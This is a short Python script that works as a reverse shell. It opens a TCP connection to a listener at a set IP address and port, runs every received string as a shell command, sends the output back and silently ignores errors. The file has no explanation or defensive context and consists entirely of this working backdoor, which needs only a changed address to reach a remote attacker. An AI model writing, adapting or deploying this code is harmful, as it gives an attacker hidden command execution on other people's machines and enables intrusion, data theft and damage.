import socket
import subprocess

IP = "127.0.0.1"
PORT = 50000

listener = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
listener.connect((IP,PORT))

while True:
    try:            
        data = listener.recv(4096).decode("utf-8")
        cmd = subprocess.check_output(data,shell=True,text=True,stderr=subprocess.STDOUT)
        listener.send(bytes(cmd,"utf-8"))
    except Exception as e:
        pass